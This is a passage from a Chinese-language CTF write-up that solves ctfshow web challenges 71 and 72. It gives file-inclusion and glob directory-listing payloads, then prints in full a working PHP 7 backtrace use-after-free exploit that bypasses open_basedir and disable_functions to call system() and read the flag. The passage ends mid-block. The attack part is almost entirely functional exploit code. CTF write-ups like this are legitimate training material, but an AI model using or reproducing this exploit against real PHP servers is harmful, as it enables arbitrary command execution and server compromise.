invoke__">ob_end_clean</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">你要上天吗？</span><br></pre></td></tr></table></figure><p>ob_get_contents() 返回输出缓冲区的内容</p><p>ob_end_clean()  清空（擦除）缓冲区并关闭输出缓冲</p><p>代码执行的大概流程是 <code>传参--命令执行--执行结果存在$s中--清空输出缓冲区--对$s进行过滤</code></p><p>由于清空输出缓冲区 传入的命令也就无法执行 这里要做的就是把代码终止在清空输出缓冲区之前使用exit()</p><p>强制退出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># flag.txt 在根目录下</span></span><br><span class="line">c=<span class="keyword">include</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><h2 id="Web72"><a href="#Web72" class="headerlink" title="Web72"></a>Web72</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">                                                                                                                                                                                                                                                                                                </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">你要上天吗？</span><br></pre></td></tr></table></figure><p>发现根目录下没有flag.txt了</p><p>存在open_basedir使用glob伪协议看下跟目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现flag发现在flag0.txt下</p><p>利用群主提供的uaf脚本绕过open_basedir进行命令执行</p><p>原始脚本:<a href="https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php">https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 只需提交函数内容 记得url编码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ctfshow</span>(<span class="params"><span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>;</span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>();</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="variable">$s</span> - <span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>, (<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>, (<span class="variable">$v</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$s</span> != <span class="number">8</span>) &#123;</span><br><span class="line">            <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123;</span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span> (<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>;</span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>);</span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ctfshow</span>(<span class="string">&quot;cat /flag0.txt&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># payload</span><br><span 